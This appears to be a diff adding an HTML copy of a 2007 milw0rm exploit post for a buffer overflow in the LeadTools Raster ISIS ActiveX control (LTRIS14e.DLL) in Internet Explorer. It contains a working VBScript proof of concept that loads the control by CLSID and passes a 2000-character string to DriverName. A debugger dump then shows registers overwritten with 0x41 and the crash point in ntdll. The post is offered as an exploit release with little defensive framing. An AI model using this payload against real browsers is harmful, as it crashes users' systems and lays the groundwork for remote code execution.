@@ -1,0 +1,39 @@
+<pre>
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/27</b></p></span>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------------------
+ <b>LeadTools Raster ISIS Object (LTRIS14e.DLL v. 14.5.0.44) Remote Buffer Overflow Exploit</b>
+ url: http://www.leadtools.com/
+ price: eheheh, take a look at thier site :)
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to this exploits.
+-----------------------------------------------------------------------------------------
+<object classid='clsid:00140797-B1BA-11CE-ABC6-F5B2E79D9E3F' id='test'></object>
+
+<script language = 'vbscript'>
+ buff = String(2000, "A")
+ 
+ test.DriverName = buff
+</script>
+
+here is a dump:
+
+EAX 41414141
+ECX 41414141
+EDX 008CC338 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+EBX 008C0000
+ESP 0348F994
+EBP 0348FBB4
+ESI 008CC330 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+EDI 00000012
+EIP 7C92142E ntdll.7C92142E
+
+7C92142E   8B39             MOV EDI,DWORD PTR DS:[ECX] <-- CRASH
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-30]
